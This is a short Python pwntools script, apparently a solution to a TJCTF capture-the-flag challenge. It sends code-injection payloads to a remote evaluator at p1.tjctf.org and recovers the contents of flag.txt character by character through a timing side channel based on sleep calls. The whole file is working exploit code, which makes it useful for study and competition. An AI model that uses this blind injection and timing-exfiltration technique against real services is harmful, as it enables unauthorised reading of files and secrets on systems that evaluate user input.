from pwn import *
from string import ascii_letters, digits
host, port = "p1.tjctf.org", 8005

s = remote(host, port)
seen = "tjctf{iTs_T1m3_f0r_a_flaggg}"
print(s.recv())
print(s.recv())

pool = "{}_" + ascii_letters + digits

s.sendline(b'12*12')
# s.recvuntil('\n')
s.recvuntil(' ')
time = s.recvuntil('\n', drop=1)
time = float(time[:-4].decode())
print(time)
print(s.recv())


for i in range(20, 30):
    for c in pool:

        payload = "for line in open('flag.txt'):       [time.sleep(0.1) for i in line if line[{}]=='{}']".format(
            i, c).encode()
        print(f"Trying .. {seen + c} at {i}")

        s.sendline(payload)
        # s.recvuntil('\n')
        s.recvuntil(' ')
        time = s.recvuntil('\n', drop=1)
        time = round(float(time.decode()), 3)
        print(time)
        print(s.recv())
        if time > 1:
            seen += c
            break

s.close()
